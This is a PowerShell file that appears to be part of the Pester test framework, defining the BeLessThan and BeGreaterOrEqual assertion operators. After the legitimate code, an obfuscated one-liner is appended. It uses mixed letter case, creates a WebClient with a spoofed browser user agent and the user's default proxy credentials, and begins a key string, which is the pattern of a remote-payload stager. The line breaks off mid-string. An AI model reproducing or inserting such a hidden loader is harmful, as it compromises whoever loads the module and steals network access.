function Should-BeLessThan($ActualValue, $ExpectedValue, [switch] $Negate, [string] $Because) {
    
    if ($Negate) {
        return Should-BeGreaterOrEqual -ActualValue $ActualValue -ExpectedValue $ExpectedValue -Negate:$false -Because $Because
    }

    if ($ActualValue -ge $ExpectedValue) {
        return New-Object psobject -Property @{
            Succeeded      = $false
            FailureMessage = "Expected the actual value to be less than $(Format-Nicely $ExpectedValue),$(Format-Because $Because) but got $(Format-Nicely $ActualValue)."
        }
    }

    return New-Object psobject -Property @{
        Succeeded = $true
    }
}


function Should-BeGreaterOrEqual($ActualValue, $ExpectedValue, [switch] $Negate, [string] $Because) {
    
    if ($Negate) {
        return Should-BeLessThan -ActualValue $ActualValue -ExpectedValue $ExpectedValue -Negate:$false -Because $Because
    }

    if ($ActualValue -lt $ExpectedValue) {
        return New-Object psobject -Property @{
            Succeeded      = $false
            FailureMessage = "Expected the actual value to be greater than or equal to $(Format-Nicely $ExpectedValue),$(Format-Because $Because) but got $(Format-Nicely $ActualValue)."
        }
    }

    return New-Object psobject -Property @{
        Succeeded = $true
    }
}

Add-AssertionOperator -Name         BeLessThan `
    -InternalName Should-BeLessThan `
    -Test         ${function:Should-BeLessThan} `
    -Alias        'LT'

Add-AssertionOperator -Name         BeGreaterOrEqual `
    -InternalName Should-BeGreaterOrEqual `
    -Test         ${function:Should-BeGreaterOrEqual} `
    -Alias        'GE'


function ShouldBeLessThanFailureMessage() {
}
function NotShouldBeLessThanFailureMessage() {
}

function ShouldBeGreaterOrEqualFailureMessage() {
}
function NotShouldBeGreaterOrEqualFailureMessage() {
}

$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

